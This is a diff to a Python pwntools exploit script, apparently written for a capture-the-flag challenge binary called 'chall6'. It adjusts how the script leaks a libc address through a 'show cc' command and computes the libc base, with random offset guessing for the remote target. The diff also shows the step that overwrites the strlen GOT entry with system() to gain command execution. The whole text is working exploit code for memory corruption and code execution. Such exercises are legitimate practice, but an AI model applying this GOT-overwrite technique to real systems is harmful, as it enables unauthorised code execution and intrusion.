@@ -7,6 +7,8 @@ target_elf = ELF('../bin/chall6')
 HOST  = ''
 PORT  = 40006
 
+context(timeout=5)
+
 NUM_ATTEMPTS = 5
 
 if len(sys.argv) > 1:
@@ -57,12 +59,13 @@ def exploit_attempt():
 		if len(HOST) > 0:
 			io = remote(HOST, PORT, level='warn')
 			target_libc = ELF('../bin/libc.so.6')
+			OFFSET_STRLEN_IMPL = random.choice([0xb1620, 0x18e590])
 		else:
 			io = target_elf.process(level='warn')
 			target_libc = target_elf.libc
+			OFFSET_STRLEN_IMPL = get_strlen_avx2(target_libc)
 
 		GOT   = target_elf.symbols['got.strlen'] # the address of strlen in GOT
-		LIBC  = get_strlen_avx2(target_libc) # distance from __strlen_avx2() leak to libc base
 		SYS   = target_libc.symbols['system'] # offset from libc base to system()
 
 		# mmm ansi
@@ -82,13 +85,13 @@ def exploit_attempt():
 
 		# step 4: leak addresses
 		io.sendline(b'show cc')
-		io.recvuntil(b'desc: ')
+		io.recvuntil(b'desc:   ')
 
-		leak = io.recvline().strip()
-		func = u64(leak + b'\x00\x00')
-		libc = func - LIBC
-		log.info('Func: 0x%012x' % func)
-		log.info('Libc: 0x%012x' % libc)
+		leak = io.recvline()[:-1]
+		func = u64(leak.ljust(8, b'\x00'))
+		libc = func - OFFSET_STRLEN_IMPL
+		log.info('Func: %#014x' % func)
+		log.info('Libc: %#014x' % libc)
 
 		# step 5: overwrite strlen() pointer in GOT with system()
 		edit(io, 'cc', 'C'*46, p64(libc + SYS), 234)
